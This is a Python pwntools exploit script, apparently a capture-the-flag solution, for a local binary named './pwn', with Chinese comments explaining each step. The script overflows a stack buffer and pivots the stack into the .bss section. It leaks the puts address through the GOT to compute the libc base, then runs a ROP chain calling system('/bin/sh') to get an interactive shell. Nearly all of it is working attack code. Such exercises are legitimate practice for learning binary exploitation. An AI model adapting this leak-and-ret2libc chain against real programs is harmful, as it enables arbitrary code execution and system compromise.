from pwn import *

context(os='linux', arch='amd64', log_level='debug')

path = './pwn'
p = process(path)
elf = ELF(path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#0x601000
bss_address = 0x601100
bss_address2 = 0x601800
pop_rdi = 0x400773
pop_rsi_r15 = 0x400771
ret_address = 0x400506

p.recvuntil(b'overflow?\n')     #部署rbp
p.send(flat(
    b'a' * 48,
    bss_address+0x30,
    elf.sym['vuln']+8           #不使用mov rsp, rbp
                                #leave: rbp = bss_address + 0x30
))

gdb.attach(p)
p.recvuntil(b'overflow?\n')     #栈迁移
p.send(flat(
    b'a' * 48,                  #rbp = bss_address + 0x30, 写入[rbp-0x30]，即写入bss_address
    bss_address+0x30,           #<---此处为bss_address + 0x30
    0x4006b4                    #不使用mov rsp, rbp
                                #leave: rsp = bss_address+0x30, pop rbp(由上, rbp = bss_address+0x30), 最终rsp = bss_address+0x38
                                #ret -> 0x4006b4 (rsp = bss_address+0x40)
                                #sub rsp, 0x30   (rsp = bss_address+0x10)
))

#rsp 0x601110
#buf: 0x601110
p.recvuntil(b'overflow?\n')     #布置新栈
p.send(flat(
    b'a' * 0x8,                 #<---rbp = bss_address + 0x30   写入[rbp-0x30]，即写入bss_address
    pop_rdi,                    #恰好这个位置是read函数的返回地址的位置，而read没有leave指令
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['vuln']
))

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
log.success(f'libc.address: {hex(libc.address)}')

libc_pop_rdx_rbx = libc.address + 0x904a9

p.recvuntil(b'overflow?\n')     #故技重施，布置rbp
p.send(flat(
    b'a' * 48,
    bss_address2+0x30,
    elf.sym['vuln']+8
))

p.recvuntil(b'overflow?\n')     #栈迁移
p.send(flat(
    b'a' * 48,
    bss_address2+0x30,
    0x4006b4
))

#gdb.attach(p)
p.recvuntil(b'overflow?\n')     #布置新栈
p.send(flat(
    0x6010f0,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret_address,
    libc.sym['system']
))

p.interactive()